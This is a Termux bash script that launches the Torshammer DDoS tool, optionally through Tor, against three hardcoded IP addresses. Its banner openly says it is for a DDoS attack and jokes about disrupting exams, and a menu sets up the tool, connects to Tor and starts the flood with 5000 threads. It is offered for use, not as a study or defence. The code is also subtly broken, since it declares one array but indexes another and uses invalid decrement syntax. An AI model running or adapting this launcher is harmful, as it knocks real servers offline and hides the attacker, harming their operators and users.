#!/data/data/com.termux/files/usr/bin/bash

termux-wake-lock

declare -a IP=("14.139.187.132" "117.240.224.6" "103.5.112.83")

sh ~amrita/update_saphira.sh;

clear;

tput bold setaf 1; echo -e "\n This script is to be used for a Torshammer DDoS attack. Have fun - say no to quantum torpedos and exams - Captain James Tiberius Kirk \n\n "; tput sgr0;

tput bold setaf 6; echo -e "After connecting to Tor network, swipe the termux screen left to right to reveal a menu. Click New Session and run this program again. To exit, click exit in the notification menu. You can also press Ctrl+c multiple times, but pls don't tire yourself \n\n "

echo "If you're using it for the first time, you might have to setup a few things. Don't worry, you won't get a blue screen of death. Just press 3 \n";

echo "For help press 3 \n";

echo "If you haven't connected to a Tor relay, press 2 \n";

echo "If you want to run Torshammer in Tor relay press 1 \n";

echo "If you want to run Torshammer without Tor, press 0 \n";

echo " \n 	Enter your choice \n";

#This line reads user choice
read -p 'Choose 1/2/3/0 : ' var;

#This is to run setup_saphira.sh
if [ $var -eq 3 ]
then
	sh setup_saphira.sh
fi

#This is to connect to Tor circuit
if [ $var -eq 2 ]
then
	tor
fi

#This is to run Torshammer in Tor
if [ $var -eq 1 ]
then
	echo "Choose IP. Valid Choice btw 1 & 3"
	read n
	n--
	python2  ~/torshammer/torshammer.py -t ${arr[n]} -r 5000 -T
fi

#This is to run Torshammer without Tor
if [ $var -eq 0 ]
then
	echo "Choose IP. Valid Choice btw 1 & 3"
	read n
	n--
	python2  ~/torshammer/torshammer.py -t ${arr[n]} -r 5000
fi

termux-wake-unlock

